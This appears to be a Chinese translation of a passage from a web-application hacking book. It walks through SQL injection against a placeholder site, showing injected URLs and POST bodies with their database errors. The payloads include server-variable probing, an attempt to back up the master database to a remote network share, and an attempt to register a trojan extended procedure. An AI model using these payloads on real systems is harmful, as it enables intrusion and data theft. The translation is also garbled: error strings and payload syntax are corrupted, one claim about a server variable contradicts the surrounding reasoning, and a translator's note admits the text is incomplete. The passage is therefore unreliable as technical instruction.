

## 230 攻破 Web 应用程序

但如错误所示，存储对可接受的参数有非常严格的格式要求。这又是一个错误。同时，这也是识别存储过程的另一种技术。

SQL 注入测试并不一定需要针对数据库表。通过执行通用的 SQL 命令即可实现。例如，同名的 `PRINT` 命令可以打印数据。为了测试 SQL 注入漏洞，我们比较了 `PRINT` 命令及其拼写错误所生成的错误：

```
http://www.victim.com/SiteAdmin.asp?SiteID=12+PRIN
```

...

Microsoft OLE DB Provider for ODBC Drivers (0x80040E14) [Microsoft][ODBC SQL Server Driver][SQL Server]Line 1: Incorrect syntax near 'PRINT'

```
http://www.victim.com/SiteAdmin.asp?SiteID=12+PRINT
```

...

Microsoft OLE DB Provider for ODBC Drivers (0x80040E14) [Microsoft][ODBC SQL Server Driver][SQL Server]Line 1: Incorrect syntax near ','

这显示了另一个成功。在两种情况下，我们都通过 ASP 将 `PRINT` 命令传递到了数据库，两种情况下的 ODBC 错误都证明了这一点。在第一种，拼写错误的 `PRINT` 命令产生了预期的错误语法。在第二种情况下，错误的语法是一个神秘的逗号——这表明数据库接受了 `PRINT` 语句，但它在打印（或存储过程的另一个参数）。对于真正的狡猾攻击者，我们考虑打印数据库变量——例如服务器名称：

```
http://www.victim.com/SiteAdmin.asp?SiteID=12+PRINT+@@ServerName
```

...

什么都没有发生。我们知道 `@@ServerName` 是 MS SQL 服务器使用的无效变量。然而，即使 `PRINT` 语句执行成功，应用程序也不知道如何向我们显示结果。它所期望的只是从 `DataAdminHome` 过程接收数据。

信任，但要验证。在返回 SQL 注入的过程中，我们必须验证调用 `@@ServerName` 确实是一个有效变量。因此，我们尝试了一个显然不是的变量。

...

```
http://www.victim.com/SiteAdmin.asp?SiteID=12+@@Abafularia
```

Microsoft OLE DB Provider for ODBC Drivers (0x80040E14) [Microsoft][ODBC SQL Server Driver][SQL Server]Must declare the variable '@@Abafularia'

我们已经折磨 `SiteAdmin.asp` 文件足够了。让我们改变方向，看看另一个同样容易受到 SQL 注入攻击的文件。再次，逐步执行注入过程是很有用的。

## 第 8 章：攻击 Web 数据存储

虽然 SQL 技术没有变化，但其注入方法会根据应用程序的设计而改变。接下来的几个示例执行起来更加困难，因为攻击必须通过 POST 请求进行。我们必须离开 URL 的舒适区，转向诸如 Achilles 类的工具。

在应用程序调查过程中，我们在 `PageSearch.asp` 文件中发现一个 `POST` 命令。参数如下：

```
Send=1&hidSearchType=1&selTextField=L_Name&txtSearchValue=zombie
```

参数 `selTextField` 看起来像是一个开始点。它似乎是表中对 `L_Name`（可能是“姓氏”）查询的占位符。与其在参数字符串中选择一个勾选，不如开始这段旅程——从不同的列中进行选择。

```
http://www.victim.com/PageSearch.asp
POST: Send=1&hidSearchType=1&selTextField=UserID&txtSearchValue=zombie
Microsoft O DB Provider for ODBC Drivers (0x80040214)
[Microsoft][ODBC SQL Server]Invalid column name 'UserID'.
/includes/spActionTable.inc, line 51
```

根据我们的“放大镜侦探式”攻击方法论，`PageSearch.asp` 受到 SQL 注入的影响，表中没有名为 `UserID` 的列，而且我们拥有一个在应用程序其他地方未被引用的文件名。对于单个数据库的单更改来说，这表现并不糟糕。

```
POST: Send=1URL%2F%2FDefault.asp&txtUserName=security&txtPwd=security%00';EXEC sp_help
[Microsoft][ODBC SQL Server][SQL Server]The object '' does not exist in database 'anapub'.
```

我们可以尝试备份整个数据库：

```
Send=1URL%2F%2FDefault.asp&txtUserName=security&txtPwd=security%00';backup=database=master&disk=\\12.16.172.116\share\bak.dat'
Microsoft O DB Provider for ODBC Drivers (0x80040005)
[Microsoft][ODBC SQL Server][SQL Server]BACKUP database permission died in database 'master'.
```

幸运的是，应用程序似乎是用低权限账户运行的。至少在头部层级处理了安全问题。在末日场景下，我们可以向数据库中插入特洛伊马。我们需要使用文件，然后执行它：

```
Send=1URL%2F%2FDefault.asp&txtUserName=security&txtPwd=security%00';EXEC_addextendedproc('+xp_trojan','+xp_trojan.dll')
Microsoft O DB Provider for ODBC Drivers (0x80040005)
[Microsoft][ODBC SQL Server][SQL Server]EXECUTE permission denied on object 'sp_addextendedproc', database 'master', owner 'dbo'.
```

## 攻破应用程序

一旦，我们被挫败了（注：此处原文似乎不完整或存在断句，已根据现有逻辑翻译）。

... 

